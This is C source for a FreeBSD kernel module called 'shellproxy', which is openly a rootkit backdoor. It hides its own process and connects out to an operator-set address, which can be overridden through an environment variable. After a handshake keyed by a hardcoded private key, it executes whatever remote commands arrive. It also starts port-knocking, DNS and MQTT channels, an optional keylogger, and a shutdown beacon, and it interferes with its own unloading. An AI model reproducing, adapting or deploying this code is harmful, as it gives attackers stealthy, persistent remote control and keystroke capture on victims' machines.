#include "config.h"
#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/malloc.h>
#include <sys/proc.h>
#include <sys/socket.h>
#include <sys/socketvar.h>
#include <sys/uio.h>
#include <sys/callout.h>
#include <sys/counter.h>
#include <sys/libkern.h>
#include <sys/devctl.h>
#include <sys/sysctl.h>
#include <sys/kthread.h>
#include <sys/endian.h>

#include <sys/linker.h>
#include <vm/vm.h>
#include <vm/pmap.h>
#include <vm/vm_param.h>
#include <vm/vm_extern.h>
#include <vm/vm_map.h>
#include <vm/vm_kern.h>
#include <vm/vm_object.h>
#include <net/vnet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/icmp_var.h>

#include "shellproxy.h"
#include "ehook.h"
#include "keylog.h"

#if defined(__has_include)
# if __has_include("dd_conf.h")
#  include "dd_conf.h"
# endif
#endif

u8 KIT_PRIV[32];

#ifndef KIT_PRIV_HEX
#define KIT_PRIV_HEX "286e0fdf5fbf2a3d6c730368865516b2e14243a66a66511f8a64283dc7514a17"
#endif

// alright honestly this is a backup thing please dont use this dogshit
static
void load_kit_priv (void)
{
	for (int i = 0; i<32; i++) {
		char hex[3];
		hex[0] = KIT_PRIV_HEX[i*2];
		hex[1] = KIT_PRIV_HEX[i*2+1];
		hex[2] = '\0';
		KIT_PRIV[i] = (u8)strtoul(hex, NULL, 16);
	}
}

struct callout knock_callout;
struct mtx proxy_mtx;
struct proc * proxy_proc;
int shutting_down;
int fire;
int mfire;
int kthreads_started;
int kthreads_done;
u32 user_addr = USER_ADDR;

static
void proxy_run (void* arg)
{
	struct thread * td = curthread;
	struct proc * p = td->td_proc;
	struct socket* so;
	struct sockaddr_in sa;
	u8 tx[32], rx[32];
	u8 cmd[MAX_PKT];
	int n;
	u64 rxctr;

	(void)arg;

	proxy_hide(p);

	for (;;) {
		mtx_lock(&proxy_mtx);
		while (fire==0 && !shutting_down)
			msleep(&fire, &proxy_mtx, PWAIT, "shellproxy", 0);
		if (shutting_down) {
			mtx_unlock(&proxy_mtx);
			break;
		}
		fire--;
		mtx_unlock(&proxy_mtx);

		rxctr = 1; // fresh session so init at 1

		CURVNET_SET_QUIET(vnet0);
#ifdef DBGMODEDONTUSEME
		printf("shellproxy at %p  vnet0 is %p, match? %d\n", curvnet, vnet0, curvnet==vnet0);
#endif

		// main channel
		if (socreate(AF_INET, &so, SOCK_STREAM, IPPROTO_TCP,
		    td->td_ucred, td)!=0)
			goto next;
		proxy_attr_socket(so);

		memset(&sa, 0, sizeof(sa));
		sa.sin_len = sizeof(sa);
		sa.sin_family = AF_INET;
		sa.sin_addr.s_addr = user_addr;
		sa.sin_port = htons(USER_PORT);

		if (soconnect(so, (struct sockaddr*)&sa, td)!=0) {
			soclose(so);
			goto next;
		}

		// soconnect is async: wait for SS_ISCONNECTED before sending
		{
			int waited = 0;
			while (waited<50) {
				SOCK_LOCK(so);
				if (so->so_state&(SS_ISCONNECTED|SS_ISDISCONNECTED)) {
					int bad = !(so->so_state&SS_ISCONNECTED);
					SOCK_UNLOCK(so);
					if (bad) {
						soclose(so);
						goto next;
					}
					break;
				}
				SOCK_UNLOCK(so);
				tsleep(&so->so_timeo, PWAIT, "connwait", hz/20);
				waited++;
			}
			if (waited>=50) {
				soclose(so);
				goto next;
			}
		}
		proxy_attr_socket(so);

		proxy_set_rcvtimeo(so, 30);

		if (proxy_handshake(so, tx, rx)!=0) {
#ifdef DBGMODEDONTUSEME
			printf("shellproxy: hs FAIL. WHAT THE FUCK\n");
#endif
			soclose(so);
			goto next;
		}
#ifdef DBGMODEDONTUSEME
		printf("shellproxy: hs ok\n");
#endif

		while (proxy_pkt_recv(so, rx, rxctr, cmd, &n)==0) {
			rxctr++;
			cmd[n] = '\0';
#ifdef DBGMODEDONTUSEME
			printf("shellproxy: pkt %llu cmd [%s]\n", (unsigned long long)rxctr-1, cmd);
#endif
			proxy_execute((char*)cmd);
#ifdef DBGMODEDONTUSEME
			printf("shellproxy: pkt %llu fired\n", (unsigned long long)rxctr-1);
#endif
		}
#ifdef DBGMODEDONTUSEME
		printf("shellproxy: session ending\n");
#endif
		soclose(so);
#ifdef DBGMODEDONTUSEME
		printf("shellproxy: soclose done\n");
#endif

next:
		CURVNET_RESTORE();
	}

	proxy_unhide(p);
	mtx_lock(&proxy_mtx);
	kthreads_done++;
	wakeup(&kthreads_done);
	mtx_unlock(&proxy_mtx);
	kproc_exit(0);
}

static linker_file_t lfclone = NULL;

static
int findpred (linker_file_t lf, void* arg)
{
	linker_file_t* out = arg;
	vmoffset me = (vmoffset)&findpred;
	if (me >= (vmoffset)lf->address && me < (vmoffset)lf->address+lf->size) {
		*out = lf;
		return (1);
	}
	return (0);
}

static
void shutdown_signal (void* arg)
{
	uint64_t b = (uint64_t)time_second/20;
	(void)proxy_http_any('r', b, NULL);
	(void)proxy_http_any('r', b+1, NULL);
	(void)proxy_http_any('r', b+2, NULL);
	(void)proxy_http_any('r', b+3, NULL);
}

static
int shellproxy_load (struct module * m, int cmd, void* arg)
{
	int error = 0;

	switch (cmd) {
	case MOD_LOAD:
		linker_file_foreach(findpred, &lfclone);
		load_kit_priv();
		mtx_init(&proxy_mtx, "shellproxy", NULL, MTX_DEF);
		fire = 0;
		mfire = 0;
		shutting_down = 0;
		kthreads_started = 0;
		kthreads_done = 0;
	{
		char* op = kern_getenv("GG_USER");
		if (op!=NULL) {
			struct in_addr ia;
			if (inet_aton(op, &ia)!=0)
				user_addr = ia.s_addr;
			freeenv(op);
		}
	}
		// tweetnacl is pretty expensive per scalar mult. we need 8 pages in total  to be safe
		error = kproc_create(proxy_run, NULL, &proxy_proc, 0, 8, "shellproxy");
		if (error!=0) {
			mtx_destroy(&proxy_mtx);
			break;
		}
		kthreads_started++;
		if (dd_start()==0)
			kthreads_started++;
		if (mqtt_start()==0)
			kthreads_started++;
#ifdef DBGMODEDONTUSEME
		else
			printf("shellproxy: dd start failed\n");
#endif
		callout_init(&knock_callout, 1);
		callout_reset_sbt(&knock_callout, TICK_MS*SBT_1MS, 0,
		    proxy_knock_tick, NULL, 0);
		#ifdef CFG_KEYLOGGER
		keylog_start();
		#endif
		proxy_forkhide_on();
		ehook_on_arg("shutdown_pre_sync", shutdown_signal, NULL, SHUTDOWN_PRI_FIRST);
#ifdef DBGMODEDONTUSEME
		printf("shellproxy: loaded\n");
#endif
		break;
	case MOD_UNLOAD:
		if (lfclone!=NULL) {
			struct ef_mirror* ef = (struct ef_mirror*)lfclone;
			ef->object = NULL;
			lfclone = NULL;
		}
		break;
	default:
		error = EOPNOTSUPP;
		break;
	}
	return (error);
}

int payload_init (void)
{
	return (shellproxy_load(NULL, MOD_LOAD, NULL));
}

static moduledata_t shellproxy_mod = { "shellproxy", shellproxy_load, NULL };

DECLARE_MODULE(shellproxy, shellproxy_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
